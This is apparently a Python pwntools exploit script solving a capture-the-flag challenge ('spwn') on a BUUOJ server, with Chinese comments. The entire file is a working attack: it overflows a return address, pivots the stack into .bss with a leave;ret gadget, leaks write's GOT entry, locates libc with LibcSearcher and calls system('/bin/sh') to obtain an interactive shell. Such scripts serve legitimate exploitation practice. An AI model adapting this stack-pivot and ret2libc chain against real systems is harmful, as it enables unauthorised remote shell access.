from pwn import *
from LibcSearcher import *

context.os = 'linux'
context.arch = 'i386'
context.log_level = 'debug'
# 只能溢出一个返回地址，但是有两次输入的机会，又是栈迁移了

if args.LOCAL:
    io = process('./spwn')
else:
    io = remote('node4.buuoj.cn', 27910)

bss_s_addr = 0x804a300
leave_ret =  0x8048408
vul_func = 0x804849b
main_addr = 0x8048513

write_plt = ELF('./spwn').plt["write"]
write_got = ELF('./spwn').got["write"]
# print(hex(write_plt), hex(write_got))

# TODO: 为什么这里用vul_func替换main_addr就不行呢？还是没太搞懂...
payload1 = p32(0xdeadbeef) + p32(write_plt) + p32(vul_func) + p32(1) + p32(write_got) + p32(4)
payload2  = b'a'*0x18 + p32(bss_s_addr) + p32(leave_ret)

io.sendlineafter(b'name?', payload1)
io.recvuntil(b'say?')
io.send(payload2)
# io.recvuntil(b'GoodBye!\n')

write_addr = u32(io.recv(4))
io.success(hex(write_addr))

libc = LibcSearcher("write", write_addr)
offset = write_addr - libc.dump("write")
# io.success(hex(offset))

sys_addr = libc.dump("system") + offset
binsh_addr = libc.dump("str_bin_sh") + offset

payload3 = p32(0xdeadbeef) + p32(sys_addr) + p32(0xbeefcafe) + p32(binsh_addr)

# payload4 = b'a'*0x18 + p32(bss_s_addr) + p32(leave_ret)

# io.sendlineafter(b'name?', payload3)
io.send(payload3)

io.recvuntil(b'say?')
io.send(payload2)

io.interactive()
